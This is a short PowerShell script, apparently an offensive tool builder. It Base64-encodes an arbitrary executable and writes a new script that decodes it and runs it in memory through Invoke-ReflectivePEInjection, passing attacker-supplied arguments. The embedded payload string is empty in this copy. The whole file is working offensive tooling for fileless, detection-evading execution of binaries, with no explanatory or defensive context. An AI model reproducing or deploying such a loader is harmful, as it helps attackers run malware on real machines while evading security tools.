Param(
        [String]
        $File,
		[String]
		$Param,
		[String]
		$Out
    )

$bytes = [System.IO.File]::ReadAllBytes($File)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText = "`$EncodedText = `"$EncodedText`""
Set-Content -Path $Out -Value $EncodedText

$Payload = ""
$PayloadText = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($Payload))
Add-Content -Path $Out -Value $PayloadText

$PEBytesText = "`$PEBytes = [System.Convert]::FromBase64String(`$EncodedText)"
Add-Content -Path $Out -Value $PEBytesText

$ExecText="Invoke-ReflectivePEInjection -PEBytes `$PEBytes -ExeArgs `"$Param`""
Add-Content -Path $Out -Value $ExecText


